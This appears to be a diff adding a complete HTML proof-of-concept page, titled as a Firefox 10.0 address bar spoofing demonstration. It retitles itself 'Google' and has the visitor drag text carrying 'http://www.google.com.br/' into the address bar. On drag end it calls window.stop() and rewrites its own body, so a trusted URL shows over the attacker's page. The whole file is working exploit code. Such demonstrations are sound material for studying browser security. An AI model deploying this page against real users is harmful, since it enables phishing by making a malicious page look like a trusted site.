@@ -1,0 +1,10 @@
+<body style='background-color:black;color:red;text-align:center;'>
+<script>document.title='Google';</script>
+<h1>Mozilla Firefox 10.0 Address Bar Spoofing Demonstration..</h1>
+<div id="tag" style='color:white;' draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'http://www.google.com.br/')" ondragend="setTimeout(
+function (){
+window.stop();c(); 
+},100);"><h3>Drag Me On Address Bar!</h3></div>  
+<h2>Drag the white text in address bar.</h4>
+<script>
+function c(){document.body.innerHTML='<h1>Done. Now look the address bar.</h1>';}</script>
